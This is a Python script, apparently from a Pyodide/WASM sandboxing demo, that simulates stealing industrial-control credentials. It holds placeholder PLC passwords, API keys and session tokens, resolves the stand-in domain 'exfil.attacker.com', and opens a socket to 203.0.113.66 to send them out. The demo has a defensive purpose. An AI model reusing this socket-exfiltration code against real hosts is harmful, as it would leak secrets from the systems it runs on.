# what: data exfiltration attack simulation for pyodide demo
# why: demonstrates python's network access attempts vs wasm capability denial
# relations: executed by demo.rs via runPython()

"""
Data Exfiltration Attack Simulation

This script attempts unauthorized network operations that could lead to
data theft. Python's socket module may attempt connections, while WASM
components without network capability cannot even make the attempt.
"""

import time

def simulate_data_exfiltration():
    """
    Simulates data exfiltration via network access.
    
    Attack Vector:
    - Collect sensitive data (credentials, API keys)
    - Attempt DNS resolution to attacker-controlled domain
    - Attempt HTTP POST to exfiltrate data
    
    In Python: Socket operations attempted (may succeed or fail at network level)
    In WASM: No network capability = instant trap, zero code executed
    """
    start_time = time.perf_counter()
    
    # Simulated sensitive data that would be targeted
    sensitive_data = {
        "plc_credentials": {
            "username": "engineer",
            "password": "S!emens#2026",
            "device": "S7-1500"
        },
        "modbus_config": {
            "gateway_ip": "192.168.40.1",
            "port": 502,
            "unit_ids": [1, 2, 3, 4, 5]
        },
        "historian_api_key": "sk-historian-PROD-8x7k2m9n",
        "scada_session_token": "eyJhbGciOiJIUzI1NiIsInR..."
    }
    
    print(f"[ATTACK] Collected {len(sensitive_data)} sensitive data objects")
    print(f"[ATTACK] Targets: {list(sensitive_data.keys())}")
    
    try:
        # Attempt to import socket (this works in Pyodide)
        import socket
        print("[INFO] Socket module imported successfully")
        
        # Stage 1: DNS resolution (reveals network capability)
        print("[ATTACK] Attempting DNS resolution to exfil.attacker.com...")
        
        try:
            # This will fail in Pyodide but shows the attempt
            resolved_ip = socket.gethostbyname("exfil.attacker.com")
            
            elapsed = (time.perf_counter() - start_time) * 1000
            return {
                "status": "VULNERABLE",
                "message": f"DNS resolved to {resolved_ip} - exfiltration possible!",
                "severity": "CRITICAL",
                "data_exposed": list(sensitive_data.keys()),
                "elapsed_ms": round(elapsed, 2)
            }
            
        except socket.gaierror as e:
            # DNS failed - but the attempt was made
            print(f"[INFO] DNS resolution failed: {e}")
            
        # Stage 2: Attempt raw socket connection
        print("[ATTACK] Attempting direct socket connection to 203.0.113.66:443...")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2.0)
            sock.connect(("203.0.113.66", 443))
            
            # If connected, attempt to send data
            payload = str(sensitive_data).encode()
            sock.send(payload)
            sock.close()
            
            elapsed = (time.perf_counter() - start_time) * 1000
            return {
                "status": "VULNERABLE",
                "message": "Socket connection established - data exfiltrated!",
                "severity": "CRITICAL",
                "bytes_sent": len(payload),
                "elapsed_ms": round(elapsed, 2)
            }
            
        except (socket.error, OSError) as e:
            elapsed = (time.perf_counter() - start_time) * 1000
            return {
                "status": "BLOCKED",
                "error_type": "socket.error",
                "message": str(e),
                "severity": "HIGH",
                "note": "Network blocked by browser sandbox, but Python allowed the attempt",
                "elapsed_ms": round(elapsed, 2)
            }
            
    except ImportError as e:
        elapsed = (time.perf_counter() - start_time) * 1000
        return {
            "status": "BLOCKED",
            "error_type": "ImportError",
            "message": f"Socket module not available: {e}",
            "elapsed_ms": round(elapsed, 2)
        }
        
    except Exception as e:
        elapsed = (time.perf_counter() - start_time) * 1000
        return {
            "status": "ERROR",
            "error_type": type(e).__name__,
            "message": str(e),
            "elapsed_ms": round(elapsed, 2)
        }


def main():
    """Entry point for Pyodide execution."""
    return simulate_data_exfiltration()


# Auto-execute when loaded by Pyodide
result = main()
result
